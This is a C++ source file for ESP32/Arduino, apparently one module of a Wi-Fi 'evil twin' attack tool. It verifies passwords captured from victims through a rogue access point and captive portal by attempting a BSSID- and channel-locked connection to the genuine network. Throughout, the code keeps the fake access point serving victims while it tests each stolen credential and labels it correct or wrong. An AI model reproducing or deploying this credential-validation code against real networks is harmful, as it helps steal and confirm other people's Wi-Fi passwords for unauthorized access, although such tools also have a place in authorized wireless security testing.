#include "evil_twin_verify.h"
#include <WiFi.h>
#include <esp_wifi.h>
#include <Arduino.h>
#include <string.h>

// ---------------------------------------------------------------------------
// Small ring of pending checks. In practice a run captures at most a handful
// of passwords, and we test them one at a time — 8 slots is enough headroom
// that a fast typist can't fill it before the current check finishes.
// ---------------------------------------------------------------------------
#define EV_QUEUE_LEN     8
#define EV_CONNECT_MS    9000    // deadline: 4-way handshake + a bit of slack
#define EV_TESTING_GAP_MS 400    // let mode changes settle before poking again

struct EvReq {
    int      cred_id;
    char     ssid[33];
    char     password[64];
    uint8_t  bssid[6];
    uint8_t  channel;
    EvilVerifyStatus status;
};

static EvReq  s_ring[EV_QUEUE_LEN];
static int    s_ring_head = 0;   // next slot to write into
static int    s_active    = -1;  // index of the request currently under test
static uint32_t s_started_ms = 0;

// Look up a slot by cred_id — returns -1 if we don't know about it. We use
// s_ring as an addressable set, keyed by cred_id, rather than a strict FIFO.
static int find_slot(int cred_id)
{
    for (int i = 0; i < EV_QUEUE_LEN; i++)
        if (s_ring[i].cred_id == cred_id && s_ring[i].ssid[0] != '\0')
            return i;
    return -1;
}

void evil_verify_enqueue(int cred_id,
                         const char *ssid, const char *password,
                         const uint8_t bssid[6], uint8_t channel)
{
    // If the same cred_id is already queued, refresh in place instead of
    // filling two slots with the same row (defensive; log_cred won't call us
    // twice for the same capture, but the UI could).
    int slot = find_slot(cred_id);
    if (slot < 0) {
        slot = s_ring_head;
        s_ring_head = (s_ring_head + 1) % EV_QUEUE_LEN;
    }

    memset(&s_ring[slot], 0, sizeof(EvReq));
    s_ring[slot].cred_id = cred_id;
    strncpy(s_ring[slot].ssid,     ssid,     sizeof(s_ring[slot].ssid) - 1);
    strncpy(s_ring[slot].password, password, sizeof(s_ring[slot].password) - 1);
    if (bssid) memcpy(s_ring[slot].bssid, bssid, 6);
    s_ring[slot].channel = channel;
    s_ring[slot].status  = EV_VERIFY_PENDING;
}

EvilVerifyStatus evil_verify_status(int cred_id)
{
    int slot = find_slot(cred_id);
    if (slot < 0) return EV_VERIFY_PENDING;
    return s_ring[slot].status;
}

// Start the STA half. SoftAP stays running because we're switching to AP_STA
// rather than STA-only — victims already associated to the twin don't drop.
// Channel-locking + BSSID-locking makes the connect deterministic even in a
// crowd of same-SSID BSSIDs (enterprise / mesh) at scan time.
static void begin_test(EvReq &r)
{
    r.status = EV_VERIFY_TESTING;
    s_started_ms = millis();

    WiFi.mode(WIFI_AP_STA);
    // Force onto the AP's channel — mismatched channel = no association attempt.
    WiFi.begin(r.ssid, r.password, (int32_t)r.channel, r.bssid, true);
}

// Called on every s_active transition out of TESTING. Puts the radio back to
// AP-only so the softAP + captive portal keep serving without a stray STA.
static void end_test()
{
    WiFi.disconnect(true, false);   // eraseap=true wipes the fail state, keep_wifi_on
    WiFi.mode(WIFI_AP);
    s_active     = -1;
    s_started_ms = 0;
}

void evil_verify_tick()
{
    // Drive the currently-active test to a result.
    if (s_active >= 0) {
        EvReq &r = s_ring[s_active];
        wl_status_t st = WiFi.status();
        if (st == WL_CONNECTED) {
            r.status = EV_VERIFY_OK;
            end_test();
        } else if (st == WL_CONNECT_FAILED ||
                   st == WL_NO_SSID_AVAIL ||
                   st == WL_CONNECTION_LOST) {
            // WL_CONNECT_FAILED after a proper 4-way handshake attempt is the
            // clean "wrong PSK" signal. WL_NO_SSID_AVAIL means the AP wasn't
            // audible on the locked channel — treat that as timeout below,
            // NOT as wrong, so we don't smear a real password as bad because
            // the target briefly disappeared.
            r.status = (st == WL_NO_SSID_AVAIL) ? EV_VERIFY_TIMEOUT
                                                : EV_VERIFY_WRONG;
            end_test();
        } else if (millis() - s_started_ms > EV_CONNECT_MS) {
            r.status = EV_VERIFY_TIMEOUT;
            end_test();
        }
        return;
    }

    // No test running — look for the next pending request.
    for (int i = 0; i < EV_QUEUE_LEN; i++) {
        if (s_ring[i].ssid[0] == '\0') continue;
        if (s_ring[i].status != EV_VERIFY_PENDING) continue;
        s_active = i;
        begin_test(s_ring[i]);
        return;
    }
}

void evil_verify_reset()
{
    if (s_active >= 0) end_test();
    memset(s_ring, 0, sizeof(s_ring));
    s_ring_head = 0;
}
